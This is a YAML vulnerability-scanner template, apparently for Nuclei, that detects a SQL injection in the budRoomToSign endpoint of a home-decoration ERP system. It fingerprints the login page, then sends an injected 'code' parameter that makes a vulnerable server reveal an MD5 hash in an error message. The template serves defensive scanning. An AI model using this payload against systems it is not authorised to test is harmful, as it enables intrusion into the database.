id: poc-yaml-znfit-erp-ms-budroomtosign-sqli
info:
  name: 家装ERP管理系统 budRoomToSign SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects an SQL injection vulnerability in the 家装ERP management system's budRoomToSign endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: step1
    method: GET
    path:
      - "{{BaseURL}}/main/login.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "上海装盟信息科技有限公司"

  - id: step2
    method: GET
    path:
      - "{{BaseURL}}/WEB_SERVICE/Budget.asmx/budRoomToSign?code=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))&no=string&bools=string"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "0x{{t2}}"
      - type: regex
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
